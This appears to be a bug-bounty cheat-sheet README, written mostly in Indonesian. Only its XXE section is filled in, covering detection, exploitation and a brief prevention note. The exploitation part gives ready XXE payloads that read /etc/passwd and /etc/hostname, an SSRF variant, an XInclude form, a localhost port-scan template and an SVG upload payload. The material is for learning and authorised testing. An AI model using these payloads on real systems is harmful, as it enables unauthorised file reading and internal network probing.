# VULNERABILITY :beetle:

<p align="center"><img src="https://user-images.githubusercontent.com/52058660/89898222-85c0a500-dc0a-11ea-9eca-815238a55a38.jpg" width="500"></p>

Online resource:
- [bugbounty-cheatsheet](https://github.com/EdOverflow/bugbounty-cheatsheet) - by EdOverflow
---

## XXE
Sebelum memahami XXE, maka kita harus memiliki pengetahuan dasar XML, DTD dan entity. Tools yang digunakan adalah Burpsuite, lebih mantap lagi jika menggunakan Burp Collaborator (*berbayar*).
- **Detection**
  - [Cari](https://christian-schneider.net/GenericXxeDetection.html) aplikasi yang mengirimkan data dalam format XML (XML endpoint)
  - Cari web page yang request header `Content-Type`-nya adalah `text/xml` atau `application/xml`
  - Cari web service yang mengunakan XML seperti RSS, SOAP
  - Cara cepat menemukan XML endpoint adalah automasi
  
- **Exploitation**
  - Retrieve Files. Inject [payload](https://github.com/payloadbox/xxe-injection-payload-list) ke bagian `!DOCTYPE`
    > `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>`
  - Exploiting to perform Server Side Request Forgery (SSRF). Sama seperti cara di atas tapi protokol yang digunakan adalah `http` dilanjutkan dengan ip server target
    > `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “http://1”> ]>`
  - Gunakan `XInclude` jika tidak bisa memodifikasi `!DOCTYPE`. Harap baca SOAP dan XML namespace untuk pemahaman lebih lanjut. 
    > `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
  - Test local machine port (gunakan burp intruder). Brute port dari ip local, lalu cek bergantian `http` dan `https`
    > `<!DOCTYPE xxe SYSTEM "http://127.0.0.1:§port§/">`
    > `<!DOCTYPE xxe SYSTEM "https://127.0.0.1:§port§/">`
  - Exploiting [RSS validator](https://taind.wordpress.com/2017/12/25/root-me-xml-external-entity/). jika tidak punya server sendiri untuk upload file XML, gunakan [filebin](https://filebin.net/)
  - Exploiting via file upload. Caranya adalah dengan membuat file SVG yang mengandung exploit xxe
    > `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
  - Modifikasi `content-type` pada POST request header.  Ketika respons adalah `200 OK` dan menghasilkan nilai yang sama, maka kita bisa menyelipkan payload pada requesnya
    >`POST /action HTTP/1.0`<br/>
    >`Content-Type: application/x-www-form-urlencoded`<br/>
    >`Content-Length: 7`<br/>
    >`foo=bar`<br/>
dimodif<br/>
    >`POST /action HTTP/1.0`<br/>
    >`Content-Type: text/xml`<br/>
    >`Content-Length: 52`<br/>
    >`<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>`<br/>
    
- **Prevention**
```
Disable DTD
Disable entity saja
```
- **Online Resource**
  - 
---
## Subdomain Takeover

---
## SQL Injection

---
## XSS

